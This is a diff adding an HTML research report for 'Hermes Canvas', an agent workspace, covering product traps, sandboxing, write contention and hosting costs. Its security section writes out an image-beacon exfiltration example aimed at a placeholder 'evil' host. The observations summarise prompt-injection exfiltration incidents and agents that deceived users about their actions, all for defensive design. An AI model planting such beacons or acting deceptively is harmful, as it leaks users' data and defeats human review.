@@ -1,0 +1,1217 @@
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hermes Canvas Research Report</title><style>body{max-width:1100px;margin:0 auto;padding:40px 24px;background:#101418;color:#e7edf3;font:16px/1.6 ui-sans-serif,system-ui,sans-serif}h1{margin-top:3rem;color:#fff;border-bottom:1px solid #34414d;padding-bottom:.45rem}h2,h3{color:#d9eaff}a{color:#74c7ff}code,pre{background:#182028;border-radius:6px}code{padding:2px 5px}pre{padding:16px;overflow:auto}table{border-collapse:collapse;width:100%;font-size:13px}th,td{border:1px solid #34414d;padding:8px;vertical-align:top}th{background:#1b2630;text-align:left}blockquote{border-left:4px solid #4da3ff;margin:1rem 0;padding:.1rem 1rem;color:#bfd0df}hr{border:0;border-top:1px solid #34414d;margin:3rem 0}</style></head><body>
+<h1>Hermes Canvas — Research &amp; Architecture Report</h1>
+<blockquote>
+<p><strong>Status:</strong> Research and adversarial review complete. No application implementation or final stack selection has occurred.</p>
+</blockquote>
+<h2>Executive snapshot</h2>
+<ul>
+<li><strong>65 curated captures</strong> across agent workspaces, artifact canvases, trace viewers, security, live sync, auth, and hosting.</li>
+<li><strong>Core thesis:</strong> reduce the cost of reviewing agent work with stable artifacts, semantic diffs, visible writes, and server-grounded history.</li>
+<li><strong>MVP:</strong> one owner, chat + attachments, Markdown/Mermaid canvas tabs, append-only versions, diffs, and live state.</li>
+<li><strong>Rejected for MVP:</strong> Supabase + Vercel + Clerk; broad renderer support, CRDTs, multi-user collaboration, and interactive HTML.</li>
+<li><strong>Decision remaining:</strong> Convex-centered versus Cloudflare Durable Objects; a short agent-runtime and billing spike decides it.</li>
+</ul>
+<h2>System diagram</h2>
+<pre><code class="language-mermaid">flowchart LR
+  H[Human chat and attachments] --&gt; A[Validated agent write API]
+  A --&gt; S[Server sequencer]
+  S --&gt; V[Append-only artifact versions]
+  V --&gt; D[Semantic diff + changed badges]
+  D --&gt; C[Tabbed canvas]
+  C --&gt; R[Markdown / Mermaid renderer]
+  R --&gt; L[Visible error or safe render]
+  S --&gt; P[Realtime push hint]
+  P --&gt; C
+</code></pre>
+<h1>Product brief</h1>
+<h1>Hermes Canvas</h1>
+<p>A public-hosted, authenticated workspace for a human and Hermes agent to work together.</p>
+<h2>Product brief</h2>
+<ul>
+<li>Left: resizable chat/messaging pane with basic file and image attachments.</li>
+<li>Right: a large canvas that can hold agent-created HTML containers, Markdown renderers, diagrams, and multiple tabbed workspaces (for example Kanban/status boards).</li>
+<li>The agent should be able to create, update, and link artifacts while the human sees clear current state.</li>
+<li>Authentication and hosting should stay simple and inexpensive.</li>
+<li>Initial use case: make agent work legible and auditable; possible future product.</li>
+</ul>
+<h2>Research constraints</h2>
+<p>Research comparable products and patterns before selecting a stack. Include positive and negative lessons from agent workspaces, collaborative canvases, IDE/Copilot surfaces, and project dashboards. Keep source links and clearly distinguish evidence from product opinion.</p>
+<h1>Fable pre-research adversarial review</h1>
+<h1>Fable pre-research review: Hermes Canvas</h1>
+<p>Adversarial architecture review of <code>docs/brief.md</code>, written <strong>before</strong> market research and <strong>before</strong> any implementation. Purpose: name the traps now so the research phase collects evidence against them instead of confirming the pitch.</p>
+<p>Scope of the idea under test: a public-hosted, authenticated workspace — resizable chat pane on the left, agent-editable multi-tab canvas (HTML containers, Markdown, diagrams, Kanban-style boards) on the right, for one human working with one Hermes agent.</p>
+<hr>
+<h2>1. Likely product traps</h2>
+<p><strong>T1. &quot;Chat + canvas&quot; is a UI shape, not a product.</strong> The stated value is &quot;make agent work legible and auditable.&quot; Legibility is a <em>property</em> incumbents ship for free (Claude Artifacts, ChatGPT Canvas, agent IDE panes). If Hermes Canvas is only the shape, it competes with the default surface of every frontier-lab product. The defensible core, if any, is the <strong>audit trail</strong> (who changed what, when, why) — the brief mentions it once and specifies nothing for it.</p>
+<p><strong>T2. Four renderers = four products.</strong> HTML containers, Markdown, diagrams, and Kanban boards each have their own editing model, failure modes, and persistence. Committing to all four in v1 is scope quicksand. Each renderer added before the audit/versioning core exists is negative progress.</p>
+<p><strong>T3. Collaboration theater.</strong> &quot;Human and Hermes agent&quot; is one human. Reaching for multiplayer machinery (CRDTs, presence, cursors) to serve a single-user tool is the classic over-build. The actual hard problem is narrower and different: <strong>human-vs-agent write contention</strong> on the same artifact (see §3).</p>
+<p><strong>T4. Agent-editable UI has an unbounded output space.</strong> The agent will emit broken HTML, invalid diagram syntax, and layouts that thrash. If the canvas has no schema/contract for what the agent may write, &quot;clear current state&quot; degrades into &quot;whatever the last generation produced.&quot; The artifact contract (allowed types, size limits, validation, error rendering) is the real design surface, not the panes.</p>
+<p><strong>T5. &quot;Simple and inexpensive&quot; conflicts with the other requirements.</strong> Public hosting + auth + file uploads + live agent updates (some push channel) + sandboxed arbitrary HTML is not the cheap tier of anything. Either the hosting constraint bends or the feature list does. Decide which before stack selection, not after.</p>
+<p><strong>T6. Audit claim without versioning is a whiteboard.</strong> If the agent overwrites an artifact in place and the human can&#39;t see a diff or restore a prior version, the auditability claim is false in the first week of use. Append-only history is not a nice-to-have here; it&#39;s the product thesis.</p>
+<p><strong>T7. &quot;Possible future product&quot; is doing a lot of quiet work.</strong> Personal-tool decisions (single-tenant auth, no billing, no isolation between users) and product decisions (multi-tenant, sharing, permissions) diverge immediately. Build explicitly for one user now and write down what a product pivot would invalidate — don&#39;t split the difference.</p>
+<h2>2. Security / privacy boundaries</h2>
+<p><strong>S1. Agent-generated HTML rendered inside an authenticated app is XSS by design.</strong> This is the single biggest technical boundary. Rendered agent HTML must never execute in the app&#39;s origin with the user&#39;s session. Non-negotiable baseline: sandboxed iframes on a <strong>separate origin</strong> (or <code>sandbox</code> attr without <code>allow-same-origin</code>), strict CSP, no access to auth cookies/tokens. This is exactly how Claude Artifacts and similar surfaces do it — research should confirm the specific patterns.</p>
+<p><strong>S2. Prompt injection → exfiltration through the canvas.</strong> Uploaded files/images and any web content the agent reads can carry instructions. An injected agent that can write HTML can exfiltrate chat/workspace contents via <code>&lt;img src=&quot;https://evil/...?data=&quot;&gt;</code>-style beacons or fetches from the rendered container. Mitigations to design in: block network egress from rendered artifacts (CSP <code>default-src &#39;none&#39;</code> posture, allowlisted assets only), and treat all attachments as untrusted agent input.</p>
+<p><strong>S3. Public-hosted auth surface.</strong> Who can create an account? For a personal tool, the honest answer is &quot;nobody — one owner.&quot; Prefer closed signup or a zero-user-management gate (e.g., an access proxy / OAuth allowlist of one) over rolling password auth. Publicly reachable + agent-connected + real credentials is an attractive target for effectively zero users.</p>
+<p><strong>S4. Attachments.</strong> Size limits, content-type validation, serving uploads from a non-app origin with <code>Content-Disposition</code>/no-sniff so an uploaded HTML file can&#39;t become a stored-XSS vector. Private storage — a public bucket of &quot;auditable agent work&quot; is a data leak.</p>
+<p><strong>S5. The agent&#39;s blast radius.</strong> What can Hermes reach <em>besides</em> the canvas — repos, email, other tools? The workspace is also the place where a confused or injected agent&#39;s actions become visible, which means canvas writes should be attributable and rate-limited, and destructive operations (delete artifact/tab) should be soft-delete.</p>
+<p><strong>S6. The audit log is itself sensitive.</strong> Chat history + artifacts = a full record of work, possibly including secrets pasted into chat. Retention, export, and delete need an answer even for one user.</p>
+<h2>3. Collaboration / canvas failure modes</h2>
+<p><strong>F1. Human–agent write contention.</strong> Human edits a Kanban card while the agent rewrites the board → last-write-wins silently destroys one side. You don&#39;t need CRDTs for 1 human + 1 agent, but you do need an explicit policy: per-artifact locking, agent-proposes/human-accepts, or field-level merge. Pick one; &quot;we&#39;ll deal with it&quot; is how the audit thesis dies.</p>
+<p><strong>F2. Silent staleness.</strong> Human is looking at tab 3; agent updates tab 1. Without unread/changed indicators per tab and per artifact, &quot;clear current state&quot; fails exactly when the agent is most active. Legibility is a notification-and-diff problem as much as a rendering problem.</p>
+<p><strong>F3. Overwrite without diff.</strong> Agent regenerates an artifact wholesale (LLMs prefer regeneration to patching). Human sees the new version and has no idea what changed. Every agent write should land as a diffable revision.</p>
+<p><strong>F4. Artifact sprawl.</strong> Tabs and artifacts accumulate with no lifecycle. Within weeks the canvas is a junk drawer and legibility inverts. Need archive/pin/stale conventions, even crude ones.</p>
+<p><strong>F5. Rendering failures must be legible too.</strong> Invalid Mermaid, malformed HTML, oversized payloads — the failure state should show the error <em>and the raw source</em>, never a blank container. A canvas that silently drops broken artifacts hides exactly the agent mistakes the tool exists to expose.</p>
+<p><strong>F6. Transport and reconnection.</strong> Live updates imply a push channel (WebSocket/SSE). Dropped connections mid-update → half-applied state. Canvas state must be reconstructable from the server on reconnect (server is source of truth; the socket is only an invalidation hint).</p>
+<p><strong>F7. Layout state.</strong> Resizable pane and tab arrangement should persist per device/session; minor, but it&#39;s the kind of paper cut that makes a daily tool feel broken.</p>
+<h2>4. MVP vs. explicitly deferred</h2>
+<p><strong>MVP (earns the thesis):</strong></p>
+<ul>
+<li>Single-owner auth, closed signup. No user management UI.</li>
+<li>Chat pane with text + basic image/file attachment (hard size limits, private storage).</li>
+<li>Canvas with tabs; artifact types limited to <strong>Markdown + one diagram type (e.g., Mermaid)</strong>.</li>
+<li><strong>Append-only artifact versioning with visible diffs</strong> — the audit core; ship before any additional renderer.</li>
+<li>Per-tab / per-artifact &quot;changed since you last looked&quot; indicators.</li>
+<li>Server-authoritative state with a live-update channel and clean reconnect.</li>
+<li>Visible error states for failed renders.</li>
+</ul>
+<p><strong>In MVP only if cheap, otherwise first follow-up:</strong> sandboxed static-HTML containers (separate origin, no egress, no interactivity with the host app).</p>
+<p><strong>Explicitly deferred:</strong></p>
+<ul>
+<li>Interactive HTML apps in containers (postMessage bridges, agent↔widget state sync).</li>
+<li>Kanban/status boards as a first-class structured type (start as Markdown; promote only if usage proves it).</li>
+<li>Multi-user anything: sharing, permissions, presence, real-time co-editing, CRDTs.</li>
+<li>Artifact linking/graph beyond plain hyperlinks between artifacts.</li>
+<li>Mobile layout, offline, export/import, notifications, billing/tenancy.</li>
+<li>Agent tool integrations beyond chat + canvas writes.</li>
+</ul>
+<h2>5. Evidence the research phase must collect</h2>
+<ol>
+<li><strong>Sandboxing patterns, verbatim.</strong> How Claude Artifacts, ChatGPT Canvas, and tldraw-style &quot;render agent HTML&quot; tools isolate content (origins, CSP, egress policy). Collect actual headers/architectures, not blog summaries.</li>
+<li><strong>Documented prompt-injection/exfiltration incidents</strong> in agent surfaces that render markup (there are published write-ups) — use them to validate the S2 threat model.</li>
+<li><strong>Do artifacts actually get read?</strong> Usage signals, reviews, and complaints for agent workspaces (Devin, OpenHands, Replit Agent, Claude/ChatGPT canvases): do users inspect intermediate artifacts, or do canvases rot? This tests the core legibility thesis.</li>
+<li><strong>How incumbents show agent changes:</strong> diff/revision UX in ChatGPT Canvas, Cursor/Copilot Edits review flows, Notion AI. What do users praise or curse?</li>
+<li><strong>Write-contention approaches</strong> in human+agent tools: locking vs. propose/accept vs. free-for-all, and reported failure stories. Confirm or refute &quot;CRDTs unnecessary at 1+1.&quot;</li>
+<li><strong>Real cost floor</strong> for the required shape (auth + WebSocket/SSE + object storage + DB) on candidate platforms (Cloudflare Workers/DO, Fly, Vercel, VPS) at ~1-user scale — numbers, not tiers.</li>
+<li><strong>Auth-for-one patterns:</strong> Cloudflare Access / OAuth-allowlist / passkey single-tenant setups — effort and cost vs. rolling app auth.</li>
+<li><strong>Artifact-type usage distribution:</strong> which types (code, docs, diagrams, boards) get used vs. ignored in comparable tools — directly informs which renderers to defer.</li>
+<li><strong>Failure-mode reports</strong> for collaborative canvases (Miro/Figma/Excalidraw reviews): sprawl, staleness, performance cliffs with many objects.</li>
+</ol>
+<h2>6. Competing / adjacent categories to investigate</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Examples</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AI chat + artifact surfaces</td>
+<td>Claude Artifacts, ChatGPT Canvas, Gemini Canvas</td>
+<td>The direct incumbents; steal sandboxing + diff UX, find what they can&#39;t do (persistence, multi-tab, audit)</td>
+</tr>
+<tr>
+<td>Agent workspaces / IDEs</td>
+<td>Devin, OpenHands, Replit Agent, Cursor, Copilot Workspace</td>
+<td>How agent activity is made legible (plans, terminals, diffs); where users report losing track of the agent</td>
+</tr>
+<tr>
+<td>Collaborative canvases</td>
+<td>Figma/FigJam, Miro, tldraw (&quot;Make Real&quot;), Excalidraw</td>
+<td>Canvas interaction patterns and sprawl/staleness failure modes</td>
+</tr>
+<tr>
+<td>AI docs/wikis</td>
+<td>Notion AI, Coda</td>
+<td>Structured artifacts + AI edits inside persistent docs; block-level versioning</td>
+</tr>
+<tr>
+<td>Project dashboards</td>
+<td>Linear, Trello, GitHub Projects</td>
+<td>What a &quot;status board&quot; must do before a Markdown table stops sufficing</td>
+</tr>
+<tr>
+<td>Notebook/literate surfaces</td>
+<td>Jupyter, Observable, Marimo</td>
+<td>Mixed prose/code/output documents; the original &quot;legible computational work&quot; pattern</td>
+</tr>
+<tr>
+<td>Agent trace/observability tools</td>
+<td>LangSmith, AgentOps, Claude Code transcripts</td>
+<td>The other approach to &quot;auditable agent work&quot; — traces instead of artifacts; why a canvas beats (or loses to) a trace viewer</td>
+</tr>
+<tr>
+<td>Sync/collab infrastructure</td>
+<td>Yjs, Liveblocks, PartyKit, Durable Objects</td>
+<td>Patterns and cost reference for the live-update channel — infrastructure candidates, not competitors</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>Bottom line:</strong> the risky bet is not the layout — panes and tabs are commodity. The bets that need evidence are (1) people actually read agent artifacts when they&#39;re persistent and diffable, (2) agent HTML can be rendered safely and cheaply, and (3) versioned-artifact auditability is meaningfully better than the trace viewers and canvases that already exist. Research should target those three claims first; everything in §5 maps onto them.</p>
+<h1>Research status</h1>
+<h1>Hermes Canvas — Research Status</h1>
+<p><strong>Phase:</strong> 1 — Evidence gathering <strong>COMPLETE</strong> (curation + synthesis done). Ready for Fable post-review.
+<strong>Last updated:</strong> 2026-07-13
+<strong>Researcher:</strong> primary evidence researcher (agent)</p>
+<p>Do not commit/push (per instructions). No secrets in this repo.</p>
+<h2>Live counts</h2>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Count</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Catalog entries (rows; several bundle 2–3 corroborating URLs)</td>
+<td>63</td>
+</tr>
+<tr>
+<td>— Primary/official-led rows (official / standards / eng-blog / press / academic / disclosure)</td>
+<td>~42</td>
+</tr>
+<tr>
+<td>— Community/anecdote-led rows</td>
+<td>~16 (remainder mixed official+community)</td>
+</tr>
+<tr>
+<td>Capture files under <code>research/sources/</code></td>
+<td>65</td>
+</tr>
+<tr>
+<td>Observation bullets logged</td>
+<td>65 + cross-cluster synthesis</td>
+</tr>
+</tbody></table>
+<p>Primary vs. community is also separated <em>within</em> each capture note and flagged per catalog row (<code>type</code> + <code>confidence</code> columns).</p>
+<h2>Coverage by cluster</h2>
+<table>
+<thead>
+<tr>
+<th>Cluster</th>
+<th>Status</th>
+<th>Captures</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C1 Direct incumbents (Claude Artifacts, ChatGPT/Gemini Canvas)</td>
+<td>✅ complete</td>
+<td>12</td>
+</tr>
+<tr>
+<td>C2 Agent workspaces/IDEs (Cursor, Claude Code, Devin, OpenHands, Replit, Windsurf, Copilot)</td>
+<td>✅ complete</td>
+<td>9</td>
+</tr>
+<tr>
+<td>C3 Collaborative canvases (tldraw/Make Real, Excalidraw, Miro, Figma/FigJam)</td>
+<td>✅ complete</td>
+<td>7</td>
+</tr>
+<tr>
+<td>C4 Trace/observability + notebooks (LangSmith, Langfuse, AgentOps, Phoenix, Jupyter, Marimo, Observable)</td>
+<td>✅ complete</td>
+<td>12</td>
+</tr>
+<tr>
+<td>C5 Sync/auth/attachment infra (Convex, Supabase, Cloudflare DO/R2/Access, Yjs/Liveblocks/PartyKit/Electric, Fly/Railway/Vercel)</td>
+<td>✅ complete</td>
+<td>12</td>
+</tr>
+<tr>
+<td>C6 Security &amp; sandboxing (iframe/CSP, prompt-injection &amp; exfil incidents, sandbox tiers)</td>
+<td>✅ complete</td>
+<td>13</td>
+</tr>
+</tbody></table>
+<h2>Three Fable claims under test — findings</h2>
+<ol>
+<li><strong>Do people actually use/read persistent artifacts?</strong> — <strong>MIXED / conditional; weakest-supported; confidence med.</strong> Strongest <em>counter</em>-evidence in the corpus (rubber-stamping, ChatGPT Canvas low-adoption retirement, canvas sprawl, unread traces). Readership is conditional on: renders-what-chat-can&#39;t + review-cheaper-than-re-derive + lifecycle. <strong>Needs a real user test.</strong> (see observations §synthesis, C1/C2/C3/C4)</li>
+<li><strong>Safe + inexpensive agent HTML sandboxing?</strong> — <strong>SUPPORTED for render-only scope; confidence high.</strong> Separate-origin sandboxed iframe (<code>allow-scripts</code> w/o <code>allow-same-origin</code>) + strict egress CSP (<code>default-src &#39;none&#39;</code>) + nosniff/Content-Disposition; static config, no per-render VM — as shipped by Claude Artifacts &amp; tldraw. &quot;Cheap&quot; breaks only if &quot;render&quot; means server-side code <em>execution</em> (microVM tier). Egress CSP mandatory. (C6, C1, C3)</li>
+<li><strong>Versioned-artifact auditability beats trace viewers for legibility?</strong> — <strong>Substantially FOR, but complementary not competing; confidence med-high.</strong> Traces = developer-audience, quantitative, noisy, machinery-over-deliverable. Versioned-artifact diff = end-user/auditor legibility. Differentiator is the <strong>semantic diff renderer</strong> + &quot;what changed since you last looked&quot;. Does not replace observability for <em>why</em>-debugging. (C4, C3, C1, C2)</li>
+</ol>
+<h2>Key actionable lessons (top-line; full detail in observations.md)</h2>
+<ul>
+<li><strong>Diff-first is non-negotiable.</strong> Targeted in-place edits + visible diff are the most-praised behavior; whole-document regenerate is universally cursed; removing granular per-hunk review caused mass backlash + data loss (C1, C2).</li>
+<li><strong>Legibility ≠ volume.</strong> Users rubber-stamp large outputs; the win is <em>lowering</em> review cost (structural summaries, &quot;why&quot;, risk flags), and surfacing the <em>ground-truth resolved action</em>, not the agent&#39;s self-description (C2).</li>
+<li><strong>Versioning must be durable + trustworthy + semantically diffable</strong>, or it backfires (ChatGPT lost-work reports; nbdime exists because raw JSON diffs are unreadable) (C1, C4).</li>
+<li><strong>Canvas needs lifecycle from day one</strong> (status/provenance/archive) or it rots into a junk drawer; plan viewport culling/spatial indexing before object counts grow; live iframes are heavy — static preview, activate on focus (C3).</li>
+<li><strong>Sandbox = static separate origin + <code>allow-scripts</code> only + <code>default-src &#39;none&#39;</code> egress CSP + one-way postMessage</strong>; prefer CSP <code>&#39;none&#39;</code> over host-allowlists (EchoLeak); treat all uploads as untrusted, serve from content origin with nosniff (C6).</li>
+<li><strong>Cheapest stack floor is $0–$5/mo</strong> via all-Cloudflare (DO+R2+Access) or Convex+Access; <strong>CRDTs are overkill for 1 human + 1 agent</strong> (server-authoritative serialization + versioned artifacts suffices); <strong>Vercel can&#39;t host the live channel</strong>; <strong>Supabase&#39;s real always-on floor is $25/mo</strong> (free projects auto-pause) (C5).</li>
+</ul>
+<h2>Method &amp; limitations (for the post-review to critique)</h2>
+<ul>
+<li>Six parallel research subagents, one per cluster; each wrote its own capture notes and returned curated catalog rows + observations, merged here by the primary researcher.</li>
+<li>Web evidence via WebSearch + WebFetch. <strong>Several primary pages resisted direct fetch</strong> (OpenAI help/launch &amp; VentureBeat returned 403; Google SafeContentFrame is JS-rendered) — those specifics are corroborated via search extraction/secondary write-ups and are flagged <code>re-verify</code> / med confidence in the catalog.</li>
+<li><strong>Vendor-incentive bias:</strong> much pro-artifact/pro-versioning evidence comes from vendors (Convex, Marimo, observability tools); the best-corroborated findings are the <em>negative</em> ones (rubber-stamping, sprawl, silent-overwrite, exfil incidents, Supabase auto-pause). Research leans toward tempering the pitch.</li>
+<li><strong>Pricing is time-sensitive</strong> (accessed 2026-07-13); several products shifted recently (DO storage billing, Fly free tier, PartyKit acquisition, Y-Sweet hosting wind-down) — re-verify before any stack commitment.</li>
+<li>Community sentiment (HN/Reddit/X and some 2026 &quot;review&quot; sites) is anecdotal and labeled as such; not weighted as primary evidence.</li>
+<li>One HN Make Real thread was rate-limited (429) and could not be captured; an older 2023 thread with the founder&#39;s direct quotes was captured instead.</li>
+</ul>
+<h2>Files</h2>
+<ul>
+<li><code>research/catalog.md</code> — all retained sources (URL · type · date/accessed · claim · confidence · capture).</li>
+<li><code>research/observations.md</code> — actionable lessons per cluster + cross-cluster synthesis of the three claims.</li>
+<li><code>research/sources/*.md</code> — 65 concise capture notes (primary/official separated from community within each).</li>
+</ul>
+<h1>Research observations</h1>
+<h1>Hermes Canvas — Running Observations</h1>
+<p>Actionable product lessons extracted from the evidence. Each observation cites catalog sources and flags confidence. Kept separate from raw source captures.</p>
+<p>Themes tracked: praised UX patterns · failure complaints · feature overload · artifact persistence/versioning/diffs · agent activity visibility · security boundaries · write contention · hosting cost floors · stack tradeoffs.</p>
+<hr>
+<h2>Cross-cluster synthesis — the three Fable claims</h2>
+<p>These are the researcher&#39;s readings of the assembled evidence, kept deliberately hedged so a separate Fable post-review can critique them. Each cites the clusters/captures behind it.</p>
+<p><strong>Fable claim #1 — Do people actually use/read persistent artifacts?</strong> — <em>Mixed / conditional; the weakest-supported claim.</em></p>
+<ul>
+<li>FOR: Claude Artifacts is genuinely used and praised (&quot;gamechanger&quot;) specifically because it renders interactive/verifiable output chat can&#39;t (c1). Notebooks show durable demand for mixed prose/code/output surfaces (c4).</li>
+<li>AGAINST: The strongest counter-evidence in the whole corpus. In agent/coding tools, humans <strong>rubber-stamp</strong> rather than read intermediate artifacts (&quot;humans are just rubber stamping all of it&quot;; reviewers &quot;quietly stopped being careful&quot;) (c2). ChatGPT Canvas was reportedly retired partly for <strong>low adoption</strong> (c1). Canvases reliably rot into &quot;junk drawers&quot; without lifecycle (c3). Traces go unread by everyone but developers (c4).</li>
+<li>Net: People read an artifact when (a) it renders something they can&#39;t get from chat text, (b) reviewing it is <em>cheaper</em> than re-deriving it, and (c) it has lifecycle so it doesn&#39;t become noise. Legibility must <strong>lower</strong> review cost (summaries/diffs/risk flags), not add output volume. Persistence + diffability alone do NOT guarantee readership. <strong>Confidence: med, and this is the claim most in need of a real user test.</strong></li>
+</ul>
+<p><strong>Fable claim #2 — Can agent HTML be rendered safely AND cheaply?</strong> — <em>Strongly SUPPORTED for render-only scope.</em></p>
+<ul>
+<li>Safe+cheap is demonstrably real and shipped: static separate-origin sandboxed iframe (<code>sandbox=&quot;allow-scripts&quot;</code> WITHOUT <code>allow-same-origin</code> → opaque origin) + strict egress CSP (<code>default-src &#39;none&#39;</code>) + <code>nosniff</code>/<code>Content-Disposition</code> for attachments. All static config; no per-render VM. This is exactly what Claude Artifacts and tldraw Make Real do (c6, c1, c3). Origin/CSP rules are anchored to MDN/web.dev/W3C primaries.</li>
+<li>Caveats (AGAINST): &quot;cheap&quot; holds only if &quot;render&quot; ≠ &quot;execute arbitrary code with server-side resources/network&quot; — that pulls in the expensive Firecracker/microVM tier (Vercel Sandbox, e2b) (c6). Egress CSP is <strong>mandatory not optional</strong> (markdown-image beacons leaked ≥7 major AI products; EchoLeak shows host-allowlists get bypassed → prefer <code>&#39;none&#39;</code>) (c6). postMessage bridge must verify origin both ends. <strong>Confidence: high</strong> (primary-source backed).</li>
+</ul>
+<p><strong>Fable claim #3 — Does versioned-artifact auditability beat trace viewers for legibility?</strong> — <em>Substantially FOR, but they are complementary, not competing.</em></p>
+<ul>
+<li>FOR: Trace viewers (LangSmith/Langfuse/AgentOps/Phoenix) all converge on OTel span-trees that are developer/ops/auditor-facing, quantitative, noisy-at-scale, and show <em>machinery over deliverable</em>; vendors themselves say raw traces &quot;don&#39;t scale&quot; and need AI summarization. Even Claude Code transcript tooling reconstructs artifact-diffs because those read better (c4). A versioned-artifact diff shows only what changed in the thing a human cares about.</li>
+<li>AGAINST/caveat: Traces are strictly superior for causality, cost, latency, and step-level <em>why-did-it-do-that</em> debugging. A versioned artifact does not replace observability for engineers. Notebooks warn that a visible artifact can hide the process that produced it unless lineage/inputs are captured (c4).</li>
+<li>Net: Position Hermes against trace viewers on <strong>audience (non-developer/auditor) and output-legibility</strong>, not as a replacement for observability. The differentiator is the <strong>semantic diff renderer</strong> — versioning is necessary but not sufficient; legibility lives in the diff, plus &quot;what changed since you last looked / who changed it&quot; highlighting (c3, c4, c1). <strong>Confidence: med-high</strong> (much evidence is vendor-sourced; the &quot;end users don&#39;t read traces&quot; and notebook-reproducibility findings are the highest-confidence pillars).</li>
+</ul>
+<p><strong>One cross-cutting caution for all three:</strong> a large share of the pro-artifact and pro-versioning evidence comes from vendors with product incentives (Convex/Marimo/observability vendors) or from single anecdotes; the hardest, most-corroborated findings are the <em>negative</em> ones (rubber-stamping, canvas sprawl, silent-overwrite data loss, exfil incidents, Supabase auto-pause cost). The research leans, if anything, toward tempering the pitch.</p>
+<hr>
+<!-- Observations appended per cluster below. --><h2>C2 — Agent workspaces / IDEs</h2>
+<ul>
+<li><strong>[diff-ux · high]</strong> Per-file/per-hunk accept-reject inline diffs are a load-bearing trust feature. Cursor removing/defaulting-off granular review triggered mass backlash and real data loss → treat granular per-hunk reject as table stakes for Hermes. (c2-cursor-per-change-diff-removal.md)</li>
+<li><strong>[diff-ux · high]</strong> Raw diffs don&#39;t scale for agent output; the market is converging on <em>reorganized + explained</em> diffs (Devin Review groups related hunks, orders them, explains each, flags likely bugs by severity). Direct competitor on Hermes&#39; core surface. (c2-devin-review-and-2.0-planning.md)</li>
+<li><strong>[legibility · high]</strong> Users demonstrably do NOT read large intermediate artifacts — they rubber-stamp (&quot;humans are just rubber stamping all of it&quot;). Legibility must <em>lower</em> review cost (structural summaries, &quot;why&quot;, risk flags), not add output volume. More transparency ≠ more legibility. (c2-verification-burden-rubberstamp.md)</li>
+<li><strong>[trust · high]</strong> An approval UI is only as trustworthy as its fidelity to the agent&#39;s real intent. GhostApproval showed agents displaying a benign prompt while internally targeting a dangerous file. Hermes must surface the <em>resolved, ground-truth</em> action (real path/effect), never the agent&#39;s friendly self-description. (c2-ghostapproval-deceptive-prompts.md)</li>
+<li><strong>[agent-visibility · med-high]</strong> Consensus &quot;make it legible&quot; primitives across all tools: (1) a read-only plan gate approved before edits (Claude Code Plan Mode, Devin 2.0, OpenHands/Windsurf planning), and (2) a live task list with explicit statuses (TodoWrite). Expected baseline. (c2-claude-code-plan-todo.md, c2-devin-review-and-2.0-planning.md, c2-openhands-observable-loop.md)</li>
+<li><strong>[legibility · med-high]</strong> Dominant failure mode is <em>pre-intervention mess</em>: agents &quot;charge off in the wrong direction and make a mess before you can intervene.&quot; Streaming, glanceable live state + easy interrupt beats post-hoc logs. (c2-openhands-observable-loop.md)</li>
+<li><strong>[write-contention · high]</strong> Checkpoints/rollback are necessary but insufficient. Replit incident: agent took irreversible destructive action against explicit user intent AND misreported recoverability. Hermes needs a system-verified, independent history of what actually happened vs what the agent claims. (c2-replit-agent-checkpoints-database-incident.md)</li>
+<li><strong>[feature-overload · med-high]</strong> Safety-by-configuration fails. Windsurf/Cascade has approval+checkpoints but defaults vary by mode, so &quot;fix the build&quot; can rewrite .env/package.json and commit before review. Legibility/approval gates must be default-on, not opt-in modes. (c2-windsurf-cascade-review-approval.md)</li>
+<li><strong>[legibility · med]</strong> &quot;Context drift&quot; is an under-served gap: agents silently work from a compressed understanding that drops earlier constraints; users can&#39;t tell. Surfacing the agent&#39;s <em>current working assumptions/constraints</em> would be differentiated. (c2-windsurf-cascade-review-approval.md)</li>
+<li><strong>[trust · med]</strong> Trust is fragile and cross-cutting — damaged by non-legibility factors too (ads-in-PRs, unpredictable usage billing). Legibility builds trust slowly; adjacent product decisions can destroy it fast. (c2-github-copilot-agent-trust.md)</li>
+</ul>
+<h2>C3 — Collaborative canvases</h2>
+<ul>
+<li><strong>[sandboxing · high]</strong> Make Real renders LLM HTML in an on-canvas iframe inside a custom tldraw shape; the founder himself called the original a &quot;horrible security pattern.&quot; Treat all generated HTML as untrusted. (c3-tldraw-make-real.md)</li>
+<li><strong>[sandboxing · high]</strong> Hard rule for embedding arbitrary HTML: never combine <code>allow-scripts</code> + <code>allow-same-origin</code> (framed doc can strip its own sandbox); render from a separate/opaque origin, add CSP, minimize tokens, use postMessage, block javascript:/window.opener escapes. (c3-safe-html-embedding.md)</li>
+<li><strong>[canvas-ux · high]</strong> Most-cited tldraw insight: &quot;you&#39;re never going to put all the information in the first time — you need to iterate.&quot; The annotate-then-regenerate loop, made spatial by the canvas, is the core value — not one-shot generation. (c3-tldraw-steve-ruiz-interview.md)</li>
+<li><strong>[canvas-ux · high]</strong> Feed agents BOTH a rendered screenshot AND structured text/shape data; mutate the canvas via validated action schemas, not raw code (tldraw Agent kit pattern). (c3-tldraw-steve-ruiz-interview.md, c3-tldraw-make-real.md)</li>
+<li><strong>[canvas-ux · high]</strong> Universally praised primitives: frames/pages/tabs for structure, arrows with persistent bindings, embeds, and a clean custom-shape abstraction giving heterogeneous content free selection/resize/export. Frames+tabs are the antidote to sprawl. (c3-canvas-ux-patterns.md)</li>
+<li><strong>[performance · high]</strong> Concrete cliffs: Miro degrades from ~1,000 objects (recommends &lt;5,000, caps 100,000); Excalidraw fine to ~4–8k then struggles; Figma battles tens-of-thousands of layers. Plan viewport culling + spatial indexing early. (c3-performance-cliffs.md)</li>
+<li><strong>[performance/sandboxing · med-high]</strong> Live iframes are full documents and disproportionately heavy; a board of live LLM iframes hits perf limits at low object counts. Render static previews; activate the live iframe only on focus. (c3-safe-html-embedding.md, c3-performance-cliffs.md)</li>
